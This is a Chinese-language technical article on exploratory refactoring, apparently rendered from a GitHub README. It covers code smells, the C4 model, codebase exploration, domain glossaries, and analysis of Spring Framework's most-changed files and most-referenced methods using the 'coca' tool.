&lt;h3&gt;&lt;a id="user-content-持续集成环境" class="anchor" aria-hidden="true" href="#持续集成环境"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;持续集成环境&lt;/h3&gt;
&lt;h3&gt;&lt;a id="user-content-记录" class="anchor" aria-hidden="true" href="#记录"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;记录&lt;/h3&gt;
&lt;h2&gt;&lt;a id="user-content-探索性重构可行方案" class="anchor" aria-hidden="true" href="#探索性重构可行方案"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;探索性重构：可行方案&lt;/h2&gt;
&lt;p&gt;我喜欢重构的那种感觉 —— 把一坨烂代码，训服成更易于阅读的代码。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-准备知识坏味道的模式" class="anchor" aria-hidden="true" href="#准备知识坏味道的模式"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;准备知识：坏味道的模式&lt;/h3&gt;
&lt;p&gt;软件开发是一种团队活动，当组织缺&lt;strong&gt;乏强有力的&lt;/strong&gt;新鲜血液时，代码便会以相同的模式编写。该组织设计出来的架构，也从某种意义上出现了大量的趋同 —— 创新反而可能不好。在这种统一的模式之下，组织的代码也会呈现相似的坏味道。代码中的坏味道的模式也往往极为相似。&lt;/p&gt;
&lt;p&gt;也因此，我们能快速地通过一小部分代码，了解整个项目的情况。&lt;/p&gt;
&lt;p&gt;为此，我们只需要根据《重构：改善既有代码的设计》一书提出的 23 种代码坏味道，整理出系统中的常见坏味道。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;集合类型&lt;/th&gt;
&lt;th&gt;坏味道&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;代码臃肿&lt;/td&gt;
&lt;td&gt;过长函数，过大的类，基本类型偏执，过长参数列，数据泥团&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;滥用面向对象&lt;/td&gt;
&lt;td&gt;Switch 声明，临时字段，被拒绝的遗赠，异曲同工的类&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;变革的障碍&lt;/td&gt;
&lt;td&gt;发散式变化，霰弹式修改，平行继承体系&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;非必要的&lt;/td&gt;
&lt;td&gt;冗余类，纯稚的数据类，重复代码，夸夸其谈的未来性，注释&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;耦合&lt;/td&gt;
&lt;td&gt;不完美的类库，依恋情结，狎昵关系，消息链，中间人&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;随后，我们便能有针对性地对代码进行重构。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-c4-模型" class="anchor" aria-hidden="true" href="#c4-模型"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;C4 模型&lt;/h4&gt;
&lt;p&gt;C4 Model 是一个非常不错的架构可视化工具，它从系统 System、容器 Container、组件 Component 和代码 Code 四个层次，由顶至底来介绍系统的架构：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/c4-model.jpg"&gt;&lt;img src="images/c4-model.jpg" alt="C4 模型" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;所以，我们可以根据 C4 模型的思路来查看整个应用的架构设计和代码情况。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-探索模式" class="anchor" aria-hidden="true" href="#探索模式"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;探索模式&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-1-从分层架构到具体代码" class="anchor" aria-hidden="true" href="#1-从分层架构到具体代码"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;1. 从分层架构到具体代码&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;代码库间关系&lt;/li&gt;
&lt;li&gt;代码库内模块化结构&lt;/li&gt;
&lt;li&gt;模块化包结构&lt;/li&gt;
&lt;li&gt;包内代码结构&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-2-从外部适配器到内部适配器" class="anchor" aria-hidden="true" href="#2-从外部适配器到内部适配器"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;2. 从外部适配器到内部适配器&lt;/h4&gt;
&lt;p&gt;举个例子，从 API 入手：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Controller&lt;/li&gt;
&lt;li&gt;Service&lt;/li&gt;
&lt;li&gt;Model&lt;/li&gt;
&lt;li&gt;DAO&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-3-查看测试情况" class="anchor" aria-hidden="true" href="#3-查看测试情况"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;3. 查看测试情况&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;是否包含单元测试&lt;/li&gt;
&lt;li&gt;是否包含集成测试&lt;/li&gt;
&lt;li&gt;测试覆盖率情况&lt;/li&gt;
&lt;li&gt;测试编写情况&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-4-针对于最复杂的情形和最简单的情形" class="anchor" aria-hidden="true" href="#4-针对于最复杂的情形和最简单的情形"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;4. 针对于最复杂的情形和最简单的情形&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;从最简单的场景出发，对常规流程、包间关系有一定的了解&lt;/li&gt;
&lt;li&gt;从复杂的场景收尾，看最复杂的场景下会有什么问题&lt;/li&gt;
&lt;li&gt;根据需要寻找一个适合的场景，&lt;/li&gt;
&lt;/ol&gt;
&lt;h4&gt;&lt;a id="user-content-工具api-列表和调用关系" class="anchor" aria-hidden="true" href="#工具api-列表和调用关系"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;工具：API 列表和调用关系&lt;/h4&gt;
&lt;p&gt;针对于那些使用 Spring 框架的后端项目来说，可以尝试使用 &lt;code&gt;coca api&lt;/code&gt; 来生成项目 API 调用图。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-构建领域知识" class="anchor" aria-hidden="true" href="#构建领域知识"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;构建领域知识&lt;/h3&gt;
&lt;p&gt;作为一个碳基生物，我们要承认我们并非是全知的。我们所能做的事，来到一个新的领域时，能快速学习相关的知识。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-了解业务架构" class="anchor" aria-hidden="true" href="#了解业务架构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;了解业务架构&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;高水平的软件架构师不仅要懂技术，还要掌握问题空间对应的业务领域知识。—— 《架构师应该知道的 97 件事》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;&lt;a id="user-content-架构全景" class="anchor" aria-hidden="true" href="#架构全景"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;架构全景&lt;/h4&gt;
&lt;p&gt;简单来说，就是你知道对系统有一个初步的认知，它包含了：业务架构、技术架构、开发组成等等。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-领域名词表" class="anchor" aria-hidden="true" href="#领域名词表"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;领域名词表&lt;/h4&gt;
&lt;p&gt;根据开发人员介绍的各种概念，抽象出一份系统的领域名词表。它的来源是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;项目的相关开发文档&lt;/li&gt;
&lt;li&gt;项目中的架构资源&lt;/li&gt;
&lt;li&gt;项目的代码&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也因此，当你需要到一个新的项目实施重构计划时，一定需要有一个能与你结对编程的人。一个领域专家，一个代码专家，双方的无间配合，才能快速落地完成重构工作。&lt;/p&gt;
&lt;p&gt;我们所要做的一个努力是，让文档、架构、元模型概念与代码实现一一对齐。这并不是一件容易的事情。从大多数项目的实践来看，架构师的设计和模型的实现往往是脱离的。因为设计架构的人和实现模型的人，往往不是同一些人。&lt;/p&gt;
&lt;p&gt;我正在尝试根据它来编写这样的一个功能，但是它不是一件容易的事。只是呢，已经有一个小的雏形，通过 &lt;code&gt;coca concept&lt;/code&gt; 从函数名称中抽取出部分的对应模式&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;WORDS&lt;/th&gt;
&lt;th&gt;COUNTS&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;blog&lt;/td&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;publish&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;entity&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;domain&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;published&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;resource&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;criteria&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;但是，这只能是构建领域名词表的一个 hello, world，并不足以承担起真正的领域名词活动，也无法构建真正的领域名词表体系。&lt;/p&gt;
&lt;p&gt;除此，我还在寻找一种更高效的构建领域特定语言方式，它用于帮助我们高效地进行软件开发，这种社会学活动。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-寻找高引用--高修改" class="anchor" aria-hidden="true" href="#寻找高引用--高修改"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;寻找高引用 + 高修改&lt;/h3&gt;
&lt;p&gt;经常修改的代码，并不是见得是件好事。我们可以从中看到一些代码的坏味道，把它朝合适的方便引进，如类库，如包内聚等等&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/refs-change.png"&gt;&lt;img src="images/refs-change.png" alt="高引用 + 高修改" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你使用的是 Git，可以通过 &lt;code&gt;coca git -t&lt;/code&gt; 识别到高修改的文件：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ENTITYNAME&lt;/th&gt;
&lt;th&gt;REVSCOUNT&lt;/th&gt;
&lt;th&gt;AUTHORCOUNT&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;build.gradle&lt;/td&gt;
&lt;td&gt;1326&lt;/td&gt;
&lt;td&gt;36&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;src/asciidoc/index.adoc&lt;/td&gt;
&lt;td&gt;239&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;build-spring-framework/resources/changelog.txt&lt;/td&gt;
&lt;td&gt;187&lt;/td&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;spring-core/src/main/java/org/springframework/core/annotation/AnnotationUtils.java&lt;/td&gt;
&lt;td&gt;170&lt;/td&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;spring-beans/src/main/java/org/springframework/beans/factory/support/DefaultListableBeanFactory.java&lt;/td&gt;
&lt;td&gt;159&lt;/td&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;src/docs/asciidoc/web/webmvc.adoc&lt;/td&gt;
&lt;td&gt;121&lt;/td&gt;
&lt;td&gt;24&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;spring-context/src/main/java/org/springframework/context/annotation/ConfigurationClassParser.java&lt;/td&gt;
&lt;td&gt;118&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;src/dist/changelog.txt&lt;/td&gt;
&lt;td&gt;118&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;spring-webmvc/src/main/java/org/springframework/web/servlet/config/annotation/WebMvcConfigurationSupport.java&lt;/td&gt;
&lt;td&gt;116&lt;/td&gt;
&lt;td&gt;15&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;上述的代码是 Spring Framework 中最常修改的文件，前面三个文件看上去是合理的，但是 &lt;code&gt;AnnotationUtils.java&lt;/code&gt; 显然有问题。&lt;/p&gt;
&lt;p&gt;对应的 &lt;code&gt;DefaultListableBeanFactory.java&lt;/code&gt; 也有 2000+ 行左右的规模。&lt;/p&gt;
&lt;p&gt;从代码的行数和修改次数来看，它们都是上帝类，并且经常出现 Bug。&lt;/p&gt;
&lt;p&gt;下表是 Spring 源码中引用最多的方法：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;REFS COUNT&lt;/th&gt;
&lt;th&gt;METHOD&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;2086&lt;/td&gt;
&lt;td&gt;org.springframework.util.Assert.notNull&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;952&lt;/td&gt;
&lt;td&gt;org.apache.commons.logging.Log.debug&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;773&lt;/td&gt;
&lt;td&gt;org.springframework.util.Assert.state&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;666&lt;/td&gt;
&lt;td&gt;org.apache.commons.logging.Log.isDebugEnabled&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;482&lt;/td&gt;
&lt;td&gt;org.apache.commons.logging.Log.trace&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;425&lt;/td&gt;
&lt;td&gt;org.springframework.util.StringUtils.hasText&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;398&lt;/td&gt;
&lt;td&gt;org.apache.commons.logging.LogFactory.getLog&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;392&lt;/td&gt;
&lt;td&gt;org.apache.commons.logging.Log.isTraceEnabled&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;268&lt;/td&gt;
&lt;td&gt;org.springframework.util.StringUtils.hasLength&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;213&lt;/td&gt;
&lt;td&gt;org.springframework.util.Assert.isTrue&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;从代码上来看，还是 Util 方法被引用得最多。似乎我们仍然需要一个更可靠的算法，来保证被引用的正常度。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-第一步防护网" class="anchor" aria-hidden="true" href="#第一步防护网"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;第一步：防护网&lt;/h2&gt;
&lt;p&gt;尽管对于某些部分的重构来说，我们只是移动一下代码的位置 —— 如分层架构的调整，它不需要我们编写对应的测试。但是呢，出于流程完整性的考虑，这一步步往往流程比较长，毕竟它可以减少系统中 bug 的出现，降低重构的风险。与此同时，这是可以由团队一起协作完成的工作，特别适合于多人的协同重构方式。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-防护网策略" class="anchor" aria-hidden="true" href="#防护网策略"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;防护网策略&lt;/h3&gt;
